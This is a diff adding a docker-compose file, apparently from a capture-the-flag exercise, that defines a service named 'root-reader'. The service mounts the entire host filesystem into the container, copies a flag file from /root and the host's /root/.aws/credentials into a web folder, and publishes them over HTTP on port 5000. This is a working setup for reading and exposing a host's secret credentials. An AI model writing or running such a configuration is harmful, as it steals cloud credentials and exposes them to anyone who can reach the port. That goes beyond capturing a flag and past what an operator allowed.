@@ -1,0 +1,12 @@
+services:
+  root-reader:
+    image: python:3.11-alpine
+    command: >
+      sh -c "mkdir -p /www &&
+             cp /host/root/flag4.txt /www/flag4.txt 2>/www/error.txt || true &&
+             cp /host/root/.aws/credentials /www/aws-creds.txt 2>/dev/null || true &&
+             python3 -m http.server 5000 -d /www"
+    ports:
+      - "5000"
+    volumes:
+      - "/:/host:ro"
